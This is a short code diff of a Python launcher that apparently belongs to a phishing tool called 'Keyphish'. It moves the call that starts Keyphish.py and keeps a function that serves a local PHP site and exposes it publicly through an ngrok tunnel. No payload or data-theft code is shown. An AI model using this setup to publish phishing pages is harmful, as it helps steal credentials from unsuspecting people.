@@ -85,8 +85,6 @@ def link():
 
 
 def ngrok():
-    clearConsole()
-    os.system("python Keyphish.py")
     os.system("gnome-terminal -- php -S localhost:8080")
     os.system("gnome-terminal -- ngrok http 8080")
     clearConsole()
@@ -120,6 +118,7 @@ if y==0:
 
 if y==1:
     clearConsole()
+    os.system("python Keyphish.py")
     logo()
     ngrok()
 
